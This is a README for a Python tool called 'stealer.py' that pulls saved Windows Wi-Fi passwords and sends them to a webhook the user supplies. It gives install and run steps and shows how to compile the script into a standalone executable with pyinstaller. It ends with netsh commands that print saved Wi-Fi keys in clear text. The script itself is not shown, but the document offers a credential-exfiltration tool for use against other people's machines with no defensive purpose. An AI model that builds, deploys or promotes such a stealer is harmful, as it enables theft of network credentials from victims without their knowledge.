# Windows-WiFi-Extractor
Extract Windows Wi-Fi Passwords to a Remote URL

# Install
Before running, install the required modules:

```
pip3 install -r requirements.txt
```

# Usage
To use, simply replace the `url` variable with your webhook and execute the following:

```
python stealer.py
```

# Making an executable
If you want to be a fancy pants, you can convert this to an exe :)

```
pyinstaller --onefile stealer.py

```

## 🔐 Check Saved Wi-Fi Networks and Passwords on Windows
---

### 📋 Step 1 & 2: Show All Saved Wi-Fi Profiles and Their Passwords

Open **Command Prompt** as Administrator, and run the following commands:

```bash
1) Show all saved Wi-Fi profiles:
   netsh wlan show profiles

2) Show the password for a specific Wi-Fi network:
   netsh wlan show profile name="<ProfileName>" key=clear





